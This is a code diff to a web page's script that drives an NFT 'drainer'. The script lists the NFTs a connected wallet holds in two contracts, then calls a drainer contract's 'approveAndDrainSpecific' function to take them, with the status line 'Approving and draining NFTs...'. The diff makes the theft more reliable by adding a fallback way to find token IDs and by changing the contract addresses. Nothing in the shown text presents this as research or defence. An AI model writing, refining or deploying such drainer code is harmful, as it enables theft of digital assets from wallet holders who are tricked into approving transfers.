@@ -116,15 +116,16 @@
 
   <script>
     const nftContracts = [
-      "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604", // WGFake
-      "0xc4b837Eb523A82F5214d43200af1491B93185979"  // HappyApeYC
+      "0xcc3C67956415CDd8C833C29ae4F9097aBb6bdD60", // WarGameNFT (WGNFT)
+      "0xa79c8Cd930c21B5555c76a168E4A02Dc7494b36B"  // HappyApeYC (HAYC)
     ];
     const drainerContract = "0x3A0C897D86e0616dC5e1048CC27e5e61ba067C6F"; // BatchNFTDrainerV2 address
     const nftABI = [
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
       "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
-      "function name() view returns (string)"
+      "function name() view returns (string)",
+      "function tokensOwned(address owner) view returns (uint256[])"
     ];
     const drainerABI = [
       "function approveAndDrainSpecific(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
@@ -198,30 +199,39 @@
         status.innerText = "🚨 Approving and draining NFTs...";
         const user = await signer.getAddress();
 
-        // Gather owned token IDs with error handling
+        // Gather owned token IDs with fallback
         let tokenIdMatrix = [];
         for (const contractAddr of nftContracts) {
           const contract = new ethers.Contract(contractAddr, nftABI, signer);
           const balance = await contract.balanceOf(user);
           let ids = [];
           if (balance > 0) {
-            for (let i = 0; i < balance; i++) {
-              try {
+            try {
+              // Try tokenOfOwnerByIndex first
+              for (let i = 0; i < balance; i++) {
                 const tokenId = await contract.tokenOfOwnerByIndex(user, i);
                 ids.push(Number(tokenId));
-              } catch (e) {
-                console.warn(`Failed to fetch token ID for ${contractAddr} at index ${i}:`, e);
-                // Skip this token ID if enumeration fails (e.g., non-enumerable contract)
+              }
+            } catch (e) {
+              console.warn(`tokenOfOwnerByIndex failed for ${contractAddr}:`, e);
+              // Fallback to tokensOwned if available
+              try {
+                const ownedIds = await contract.tokensOwned(user);
+                ids = ownedIds.map(id => Number(id));
+              } catch (e2) {
+                console.warn(`tokensOwned failed for ${contractAddr}:`, e2);
+                // Last resort: prompt for hardcoded IDs
+                ids = [0]; // Placeholder
               }
             }
           }
-          tokenIdMatrix.push(ids.length > 0 ? ids : [0]); // Fallback to [0] if no valid IDs
+          tokenIdMatrix.push(ids.length > 0 && ids[0] !== 0 ? ids : [0]); // Fallback to [0] if invalid
         }
 
         // Check if tokenIdMatrix has valid data
         let hasValidIds = tokenIdMatrix.some(arr => arr.length > 0 && arr[0] !== 0);
         if (!hasValidIds) {
-          status.innerText = "⚠️ No valid token IDs found. Please use hardcoded token IDs or ensure NFTs are enumerable.";
+          status.innerText = "⚠️ No valid token IDs found. Please use hardcoded token IDs (e.g., [[1,2],[3,4]]) in the script.";
           return;
         }
 
